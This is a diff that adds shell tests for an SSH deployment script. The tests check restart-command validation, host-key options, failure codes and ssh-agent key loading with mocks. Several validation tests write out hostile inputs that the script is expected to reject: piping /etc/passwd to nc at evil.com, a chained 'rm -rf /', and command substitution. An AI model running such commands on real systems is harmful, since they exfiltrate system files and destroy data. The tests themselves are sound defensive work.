@@ -183,6 +183,136 @@ Describe "deploy/ssh.sh"
       End
     End
 
+    Describe "restart-cmd unsafe character validation"
+      setup_unsafe() {
+        mock.setup
+        TEST_WS="$(mktemp -d)"
+        MOCK_LOG="${TEST_WS}/mock_cmds.log"
+        mock.create_logging "rsync" "$MOCK_LOG"
+        mock.create_logging "ssh" "$MOCK_LOG"
+        mock.activate
+      }
+      cleanup_unsafe() {
+        mock.cleanup
+        rm -rf "$TEST_WS"
+      }
+      Before 'setup_unsafe'
+      After 'cleanup_unsafe'
+
+      It "returns 2 when restart-cmd contains pipe character"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --restart-cmd "cat /etc/passwd | nc evil.com 1234"
+        The status should equal 2
+        The stderr should include "unsafe characters"
+      End
+
+      It "returns 2 when restart-cmd contains backtick"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --restart-cmd 'echo `whoami`'
+        The status should equal 2
+        The stderr should include "unsafe characters"
+      End
+
+      It "returns 2 when restart-cmd contains semicolon"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --restart-cmd "systemctl restart app; rm -rf /"
+        The status should equal 2
+        The stderr should include "unsafe characters"
+      End
+
+      It "returns 2 when restart-cmd contains dollar sign"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --restart-cmd 'echo $(whoami)'
+        The status should equal 2
+        The stderr should include "unsafe characters"
+      End
+
+      It "allows safe restart commands"
+        invoke_safe_cmd() {
+          deploy.ssh.run --host deploy.example.com --path /srv/app \
+            --restart-cmd "systemctl restart my-app_v2" 2>/dev/null || return 1
+        }
+        When call invoke_safe_cmd
+        The status should be success
+      End
+    End
+
+    Describe "BRIK_SSH_STRICT_HOST_KEY"
+      setup_strict_host() {
+        mock.setup
+        TEST_WS="$(mktemp -d)"
+        MOCK_LOG="${TEST_WS}/mock_cmds.log"
+        mock.create_logging "rsync" "$MOCK_LOG"
+        mock.create_logging "ssh" "$MOCK_LOG"
+        mock.activate
+        export BRIK_SSH_STRICT_HOST_KEY="no"
+      }
+      cleanup_strict_host() {
+        mock.cleanup
+        unset BRIK_SSH_STRICT_HOST_KEY 2>/dev/null
+        rm -rf "$TEST_WS"
+      }
+      Before 'setup_strict_host'
+      After 'cleanup_strict_host'
+
+      It "passes StrictHostKeyChecking=no to rsync ssh options"
+        invoke_strict_no() {
+          deploy.ssh.run --host deploy.example.com --path /srv/app 2>/dev/null || return 1
+          grep -q "StrictHostKeyChecking=no" "$MOCK_LOG"
+        }
+        When call invoke_strict_no
+        The status should be success
+      End
+    End
+
+    Describe "passthrough options"
+      setup_passthrough() {
+        mock.setup
+        TEST_WS="$(mktemp -d)"
+        MOCK_LOG="${TEST_WS}/mock_cmds.log"
+        mock.create_logging "rsync" "$MOCK_LOG"
+        mock.create_logging "ssh" "$MOCK_LOG"
+        mock.activate
+      }
+      cleanup_passthrough() {
+        mock.cleanup
+        rm -rf "$TEST_WS"
+      }
+      Before 'setup_passthrough'
+      After 'cleanup_passthrough'
+
+      It "silently ignores --target and --env options"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --target prod --env staging
+        The status should be success
+        The stderr should include "ssh deployment completed"
+      End
+    End
+
+    Describe "remote restart failure"
+      setup_restart_fail() {
+        mock.setup
+        TEST_WS="$(mktemp -d)"
+        MOCK_LOG="${TEST_WS}/mock_cmds.log"
+        mock.create_logging "rsync" "$MOCK_LOG"
+        mock.create_exit "ssh" 1
+        mock.activate
+      }
+      cleanup_restart_fail() {
+        mock.cleanup
+        rm -rf "$TEST_WS"
+      }
+      Before 'setup_restart_fail'
+      After 'cleanup_restart_fail'
+
+      It "returns 5 when remote restart command fails"
+        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
+          --restart-cmd "systemctl restart myapp"
+        The status should equal 5
+        The stderr should include "remote restart command failed"
+      End
+    End
+
     Describe "with failing rsync"
       setup_fail_rsync() {
         mock.setup
@@ -231,6 +361,194 @@ Describe "deploy/ssh.sh"
         }
         When call invoke_env_dryrun
         The status should be success
+      End
+    End
+
+    Describe "_deploy.ssh.setup_agent"
+      Describe "skip when no SSH_PRIVATE_KEY"
+        setup_no_key() {
+          unset SSH_PRIVATE_KEY 2>/dev/null
+        }
+        Before 'setup_no_key'
+
+        It "returns 0 when SSH_PRIVATE_KEY is unset"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+        End
+      End
+
+      Describe "skip when agent already has identities"
+        setup_agent_ok() {
+          mock.setup
+          export SSH_PRIVATE_KEY="inline-key-content"
+          mock.create_exit "ssh-add" 0
+          mock.activate
+        }
+        cleanup_agent_ok() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY 2>/dev/null
+        }
+        Before 'setup_agent_ok'
+        After 'cleanup_agent_ok'
+
+        It "returns 0 when ssh-add -l succeeds"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+        End
+      End
+
+      Describe "inline key loading"
+        setup_inline_key() {
+          mock.setup
+          TEST_WS="$(mktemp -d)"
+          MOCK_LOG="${TEST_WS}/mock_cmds.log"
+          export SSH_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----
+FAKEKEYDATA
+-----END RSA PRIVATE KEY-----"
+          # ssh-add -l must fail (no identities) so setup continues
+          cat > "${MOCK_BIN}/ssh-add" <<'SCRIPT'
+#!/bin/sh
+if [ "$1" = "-l" ]; then exit 1; fi
+exit 0
+SCRIPT
+          chmod +x "${MOCK_BIN}/ssh-add"
+          mock.create_exit "ssh-agent" 0
+          mock.activate
+          export SSH_AUTH_SOCK="/tmp/fake-ssh-agent.sock"
+        }
+        cleanup_inline_key() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY SSH_AUTH_SOCK 2>/dev/null
+          rm -rf "$TEST_WS"
+        }
+        Before 'setup_inline_key'
+        After 'cleanup_inline_key'
+
+        It "loads inline key via ssh-add stdin"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+          The stderr should include "SSH key loaded"
+        End
+      End
+
+      Describe "file key loading"
+        setup_file_key() {
+          mock.setup
+          TEST_WS="$(mktemp -d)"
+          printf '%s\n' "-----BEGIN RSA PRIVATE KEY-----" "FAKEKEYDATA" "-----END RSA PRIVATE KEY-----" > "${TEST_WS}/id_rsa"
+          export SSH_PRIVATE_KEY="${TEST_WS}/id_rsa"
+          cat > "${MOCK_BIN}/ssh-add" <<'SCRIPT'
+#!/bin/sh
+if [ "$1" = "-l" ]; then exit 1; fi
+exit 0
+SCRIPT
+          chmod +x "${MOCK_BIN}/ssh-add"
+          mock.create_exit "ssh-agent" 0
+          mock.activate
+          export SSH_AUTH_SOCK="/tmp/fake-ssh-agent.sock"
+        }
+        cleanup_file_key() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY SSH_AUTH_SOCK 2>/dev/null
+          rm -rf "$TEST_WS"
+        }
+        Before 'setup_file_key'
+        After 'cleanup_file_key'
+
+        It "loads key from file path"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+          The stderr should include "SSH key loaded"
+        End
+      End
+
+      Describe "starts ssh-agent when SSH_AUTH_SOCK unset"
+        setup_no_sock() {
+          mock.setup
+          TEST_WS="$(mktemp -d)"
+          export SSH_PRIVATE_KEY="inline-key"
+          cat > "${MOCK_BIN}/ssh-add" <<'SCRIPT'
+#!/bin/sh
+if [ "$1" = "-l" ]; then exit 1; fi
+exit 0
+SCRIPT
+          chmod +x "${MOCK_BIN}/ssh-add"
+          # ssh-agent must output valid eval-able content
+          printf '#!/bin/sh\necho "SSH_AUTH_SOCK=/tmp/test; export SSH_AUTH_SOCK"\n' > "${MOCK_BIN}/ssh-agent"
+          chmod +x "${MOCK_BIN}/ssh-agent"
+          mock.activate
+          unset SSH_AUTH_SOCK 2>/dev/null
+        }
+        cleanup_no_sock() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY SSH_AUTH_SOCK 2>/dev/null
+          rm -rf "$TEST_WS"
+        }
+        Before 'setup_no_sock'
+        After 'cleanup_no_sock'
+
+        It "starts ssh-agent and loads key"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+          The stderr should include "ssh-agent started"
+        End
+      End
+
+      Describe "inline key add failure"
+        setup_inline_fail() {
+          mock.setup
+          export SSH_PRIVATE_KEY="bad-inline-key"
+          cat > "${MOCK_BIN}/ssh-add" <<'SCRIPT'
+#!/bin/sh
+if [ "$1" = "-l" ]; then exit 1; fi
+exit 1
+SCRIPT
+          chmod +x "${MOCK_BIN}/ssh-add"
+          mock.activate
+          export SSH_AUTH_SOCK="/tmp/fake.sock"
+        }
+        cleanup_inline_fail() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY SSH_AUTH_SOCK 2>/dev/null
+        }
+        Before 'setup_inline_fail'
+        After 'cleanup_inline_fail'
+
+        It "warns and returns 0 when inline key add fails"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+          The stderr should include "failed to add inline SSH key"
+        End
+      End
+
+      Describe "file key add failure"
+        setup_file_fail() {
+          mock.setup
+          TEST_WS="$(mktemp -d)"
+          printf 'bad-key-data\n' > "${TEST_WS}/id_rsa"
+          export SSH_PRIVATE_KEY="${TEST_WS}/id_rsa"
+          cat > "${MOCK_BIN}/ssh-add" <<'SCRIPT'
+#!/bin/sh
+if [ "$1" = "-l" ]; then exit 1; fi
+exit 1
+SCRIPT
+          chmod +x "${MOCK_BIN}/ssh-add"
+          mock.activate
+          export SSH_AUTH_SOCK="/tmp/fake.sock"
+        }
+        cleanup_file_fail() {
+          mock.cleanup
+          unset SSH_PRIVATE_KEY SSH_AUTH_SOCK 2>/dev/null
+          rm -rf "$TEST_WS"
+        }
+        Before 'setup_file_fail'
+        After 'cleanup_file_fail'
+
+        It "warns and returns 0 when file key add fails"
+          When call _deploy.ssh.setup_agent
+          The status should be success
+          The stderr should include "failed to add SSH key from file"
+        End
       End
     End
 
